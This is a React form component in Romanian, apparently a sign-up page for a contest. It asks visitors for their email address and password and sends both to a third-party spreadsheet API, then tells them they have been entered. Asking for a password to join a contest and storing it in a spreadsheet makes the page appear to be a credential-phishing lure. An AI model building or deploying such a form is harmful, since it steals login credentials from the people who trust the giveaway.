import React, { useState } from "react";
import axios from "axios";
import logo from "../poze/complete+done+green+success+valid+icon-1320183462969251652.png";

function InputForm() {
  const [email, setEmail] = useState("");
  const [nume, setNume] = useState("");
  const [prenume, setPrenume] = useState("");
  const [telefon, setTelefon] = useState("");
  const [parola, setParola] = useState("");
  const [inscris, setInscris] = useState(true);

  const moreProps = "flex flex-col items-center gap-3";

  const handleSubmit = (e) => {
    e.preventDefault();
    const data = {
      Email: email,
      Parola: parola,
    };
    axios
      .post("https://sheet.best/api/sheets/728c92b1-e241-48b9-a960-b78875ac2ae7", data)
      .then((response) => {
        console.log(response);
        setInscris(false);
      })
      .catch(function (error) {
        console.log(error);
      });
  };

  return (
    <form>
      <div className={!inscris ? "hidden" : "visible"}>
        <div class="mb-6">
          <label for="email" class="flex mb-2 text-sm font-medium text-gray-900 dark:text-white">
            Adresa E-Mail
          </label>
          <input type="email" id="email" class="shadow-sm bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg block w-full p-2.5" required onChange={(e) => setEmail(e.target.value)} />
        </div>
        <div class="mb-6">
          <label for="email" class="flex mb-2 text-sm font-medium text-gray-900 dark:text-white">
            Parola
          </label>
          <input type="password" id="Parola" class="shadow-sm bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg block w-full p-2.5" required onChange={(e) => setParola(e.target.value)} />
        </div>
        {/* <div class="mb-6">
          <label for="password" class="flex mb-2 text-sm font-medium text-gray-900 dark:text-white">
            Nume
          </label>
          <input type="text" id="nume" class="shadow-sm bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg block w-full p-2.5" required onChange={(e) => setNume(e.target.value)} />
        </div>
        <div className="mb-6">
          <label for="repeat-password" className="flex mb-2 text-sm font-medium text-gray-900 dark:text-white">
            Prenume
          </label>
          <input type="text" id="prenume" className="shadow-sm bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg block w-full p-2.5" required onChange={(e) => setPrenume(e.target.value)} />
        </div>
        <div className="mb-6">
          <label for="repeat-password" className="flex mb-2 text-sm font-medium text-gray-900 dark:text-white">
            Telefon
          </label>
          <input type="number" id="phone" className="shadow-sm bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg block w-full p-2.5" placeholder="07XXXXXXXX" required onChange={(e) => setTelefon(e.target.value)} />
        </div> */}
        <div className="flex items-start mb-6">
          <div className="flex items-center h-5">
            <input id="terms" type="checkbox" value="" class="w-4 h-4 border border-gray-300 rounded bg-gray-50 focus:ring-3 focus:ring-blue-300 dark:bg-gray-700 dark:border-gray-600 dark:focus:ring-blue-600 dark:ring-offset-gray-800 dark:focus:ring-offset-gray-800" required />
          </div>
          <label for="terms" className="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300" required>
            Sunt de acord sa particip la concurs !
          </label>
        </div>
      </div>
      {/* <div className="flex flex-col items-center gap-3"> */}
      <div className={`${inscris ? "hidden" : "visible"} ${moreProps}`}>
        <img src={logo} alt="" />
        <h1 className="text-green-500 text-2xl pb-10">Felicitari, ai fost inscris la concurs!</h1>
      </div>
      <div className="flex items-center justify-center">
        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1" stroke="currentColor" className="w-10 h-10 bg-red-500 text-white rounded-l-lg">
          <path
            stroke-linecap="round"
            stroke-linejoin="round"
            d="M21 11.25v8.25a1.5 1.5 0 01-1.5 1.5H5.25a1.5 1.5 0 01-1.5-1.5v-8.25M12 4.875A2.625 2.625 0 109.375 7.5H12m0-2.625V7.5m0-2.625A2.625 2.625 0 1114.625 7.5H12m0 0V21m-8.625-9.75h18c.621 0 1.125-.504 1.125-1.125v-1.5c0-.621-.504-1.125-1.125-1.125h-18c-.621 0-1.125.504-1.125 1.125v1.5c0 .621.504 1.125 1.125 1.125z"
          />
        </svg>
        <button className="text-white bg-gradient-to-r rounded-r-lg from-blue-500 to-blue-400  hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium text-sm px-5 py-2.5 text-center dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800" onClick={handleSubmit}>
          Inregistrare
        </button>
      </div>
    </form>
  );
}

export default InputForm;
